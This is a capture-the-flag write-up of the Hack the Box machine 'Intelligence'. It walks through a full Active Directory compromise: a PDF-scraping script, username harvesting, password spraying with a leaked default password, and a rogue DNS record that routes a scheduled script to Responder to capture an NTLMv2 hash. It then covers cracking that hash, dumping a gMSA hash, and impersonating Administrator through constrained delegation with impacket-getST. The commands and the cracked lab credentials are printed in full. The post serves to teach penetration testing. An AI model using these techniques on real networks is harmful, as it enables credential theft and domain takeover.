---
layout: post
title:  "Hack the Box - Intelligence"
categories: "Writeups"
---

## Enumeration
# NMAP

- I won't be providing the output due to it being so large for the page but running a basic scan shows us we are dealing with a Domain Controller along with a web page (interesting...)

# Web Page
- We can see two pdfs available but maybe there are more available but on the web page?
- Python script to download within the year 2020
- Note: I believe when I went through this, I referenced 0xdf's blog and got input from his script

```python3
#!/usr/bin/env python3

import requests
import argparse
import datetime

def main():
    parser = argparse.ArgumentParser(description="Script to download PDFs from website/Intelligence on HTB")
    parser.add_argument('-url', required=True, help='URL for webpage')
    options = parser.parse_args()


    # Testing how to download a file :D
    # url = 'http://intelligence.htb/documents/2020-01-01-upload.pdf'
    # r = requests.get(url)
    # with open("2020-01-01-upload.pdf", 'wb') as f:
    #     f.write(r.content)
    
    # Adding zeros in front of int, for 01, 02, 03 ... 09
    # This matches the PDF format
    # num = "1"
    # print(num.zfill(2))
    downloadFiles(options.url)


def downloadFiles(url):
    start_date = datetime.datetime(2020, 1, 1)
    end_date = datetime.datetime(2020, 12, 31)

    while True:
        u = start_date.strftime(url + "/documents/%Y-%m-%d-upload.pdf")
        r = requests.get(u)
        if r.status_code == 200:
            print(f"[*] URL: {u}")
            with open(u.replace("http://intelligence.htb/documents/", ""), "wb") as f:
                print(f"[*] Getting pdf: {u}...")
                f.write(r.content)

        start_date = start_date + datetime.timedelta(days=1)
        if start_date >= end_date:
            break



main()
```

## Observing PDFs
- We can get usernames from them based on the creator section from exiftool

```bash
exiftool * | grep "Creator" | awk '{print $3}' | sort -u > ../users.lst
```

```text
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```
- Lets check the contents of the pdfs and maybe there is something

- We can use "pdfgrep" to search through for keywords, like password
```bash
pdfgrep "password" *
```
- Shows us "2020-06-04" contains the word we are searching for!
- Default password of "NewIntelligenceCorpUser9876" we can use to password spray
- We get a hit with Tiffany Molina!
- ![[TMolinda-PassSpray.png]](/images/HTB/Intelligence/TMolinda-PassSpray.png)

## Tiffany Molina
# SMB Enum
- We can read IPC$, IT, NETLOGON, SYSVOL, Users
- IT would be most interesting

# IT Share
- PowerShell Script

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
- What this script is doing is finding any domain that starts with "web" within the intelligence domain then using the credentials of Ted Graves, it sends out an email
- But what if it connects to a domain we create and sends the creds of Ted?

- [Check out this tool for creating a dns record](https://github.com/dirkjanm/krbrelayx)


```bash
sudo python3 /home/turco/hacking-tools/krbrelayx/dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webturco.intelligence.htb -a add -t A -d 10.10.14.5 10.10.10.248
```
- Confirm with nslookup:

![[webturco-confirm.png]](/images/HTB/Intelligence/webturco-confirm.png)
- The domain "webturco.intelligence.htb" points back to my tun0 address
- Start up responder and wait for a connection from Ted Graves (script runs every 5 min)


# Cracking hash

- We get Ted's hash and its an NTLMv2 so we need to crack with hashcat/john
- Responder: (edit /etc/responder/Responder.conf and turn on HTTP server)
- ![[teddy-responder.png]](/images/HTB/Intelligence/teddy-responder.png)
- Hashcat NTLMv2 value = 5600 

```
Ted.Graves : Mr.Teddy
```

## Ted Graves Enumeration
# Bloodhound
- Analyzing Ted.Graves in bloodhound shows he is part of the ITSuport group which can "ReadGMSAPassword" on svc_int under "Group Delegated Object Control"
- [Tool I used](https://github.com/micahvandeusen/gMSADumper)
- ![[ted-readgmsa-BH.png]](/images/HTB/Intelligence/ted-readgmsa-BH.png)
- ![[readgmsaDumper.png]](/images/HTB/Intelligence/readgmsaDumper.png)

```
svc_int$ : 6bf735e60852b92212d512a4deadcfea
```

- But analyzing more from svc_int, we see its allowed to delegate to the DC
- ![[AllowedToDelegateBH.png]](/images/HTB/Intelligence/AllowedToDelegateBH.png)
- AllowedToDelegate: WWW/dc.intelligence.htb (SPN)

# Abusing AllowedToDelegate
- We can impersonate the Administrator by generating a service ticket using that SPN
```bash
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes <NTLM>
```


- Generating this service ticket will allow us to impersonate the Administrator on DC
- [Artcile about unconstrained delegation](https://stealthbits.com/blog/constrained-delegation-abuse-abusing-constrained-delegation-to-achieve-elevated-access/)
- Proof of admin:
![[whoami-Admin.png]](/images/HTB/Intelligence/whoami-Admin.png)